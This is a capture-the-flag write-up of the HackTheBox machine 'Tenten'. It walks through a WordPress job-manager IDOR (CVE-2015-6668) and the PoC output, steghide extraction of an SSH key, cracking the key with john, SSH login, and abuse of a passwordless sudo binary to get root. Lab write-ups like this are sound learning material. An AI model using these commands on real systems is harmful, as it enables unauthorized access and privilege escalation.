# Hackthebox Tenten

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

### Attack Summary

1. Wordpress plugin Job-manager IDOR
2. Steganography to get private key
3. Sudo misconfiguration


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Fri Dec 28 11:42:30 2018 as: nmap -v -sV -p- -T4 -oA tenten_full 10.10.10.10
Nmap scan report for 10.10.10.10
Host is up (0.075s latency).

```

Visiting the website on port 80 we are presented with a wordpress site for some form of job posting.

Let's scan the site with wpscan.

There are some vulnerabilities in the running version of Wordpress. There is also a plugin called job-manager that suffers from a IDOR bug.

### Content Discovery 

I ran a Gobuster scan against the application but it did not return anything interesting.

## Initial Compromise

Lets check the IDOR issue in the plugin. This site describes the issue: https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/

So the issue is that we basically can locate and access what other people have uploaded by incrementing the number in the following URL: http://10.10.10.10/index.php/jobs/apply/8/.

Looping through titles from 1 to 20 I found one that seemed interesting "job Application: HackerAccessGranted". Using the poc from the website and modifying it a bit to also look for images we get the followingh hit:

```
root@kali:~/htb/tenten# python poc.py 
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10 
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

This is where this box turns very unrealistic and more like a ctf. There is a hidden file within the image. Steganography is a common thing to use in ctfs.

The following command will extract the file which is a private key. 
```
root@kali:~/htb/tenten# steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".
```

The key is encrypted so we need to crack it. We can use 22h2john to output the key in a crackable format:

```
root@kali:~/htb/tenten# ssh2john id_rsa > crack.txt

root@kali:~/htb/tenten# john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
1g 0:00:00:01 DONE (2018-12-28 13:14) 0.6666g/s 520024p/s 520024c/s 520024C/s superpassword
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We we found the password "superpassword" and can now log in as the user takis with the private key.

```
root@kali:~/htb/tenten# ssh takis@10.10.10.10 -i id_rsa 
Enter passphrase for key 'id_rsa':

## Pivilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

So I go to /dev/shm and upload a privsc script called LinEnum.

The script gives us the following juicy stuff

```
[+] We can sudo without supplying a password!                                                                         
Matching Defaults entries for takis on tenten:                                  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
                                                                                                                        
User takis may run the following commands on tenten:                                                                                
    (ALL : ALL) ALL                                                                                                             
    (ALL) NOPASSWD: /bin/fuckin  
```

Let's runthe binary and see what it does

```
takis@tenten:~$ sudo /bin/fuckin
```

Nothing happens, so we could tru to just run strings onthe binary and see what se get.

```
takis@tenten:~$ strings /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
takis@tenten:~$ sudo /bin/fuckin bash
root@tenten:~# id
uid=0(root) gid=0(root) groups=0(root)
```
So it needed an argument that it seems to just execute.
